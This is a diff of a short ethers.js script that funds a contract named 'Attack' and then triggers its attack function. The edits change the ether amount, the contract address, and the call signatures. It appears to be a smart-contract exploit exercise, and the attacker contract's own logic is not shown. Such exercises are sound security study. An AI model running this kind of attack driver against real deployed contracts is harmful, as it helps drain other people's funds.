@@ -1,15 +1,15 @@
 async function main() {
-    const AMOUNT = ethers.parseEther("0.1"); //bignumber
+    const AMOUNT = ethers.parseEther("0.01"); //bignumber
     let att;
     const [owner] = await ethers.getSigners();
     att = await ethers.getContractAt(
       "Attack", 
-      "0x4Ca2c430cB779709918C9220Ca9f97F4B47C2685", 
+      "0x95C247aCfaB40b53d53C8FC597f538Fae5F4FE65", 
       owner
     );
-    const txn1 = await att.depo("0x56291FDC3797267F94dbd21D6e4016D6C748393C",{value: AMOUNT});
+    const txn1 = await att.deposit({value: AMOUNT});
     await txn1.wait(1);
-    const txn2 = await att.attack("0x56291FDC3797267F94dbd21D6e4016D6C748393C");
+    const txn2 = await att.attack();
     await txn2.wait(1);
   }
   
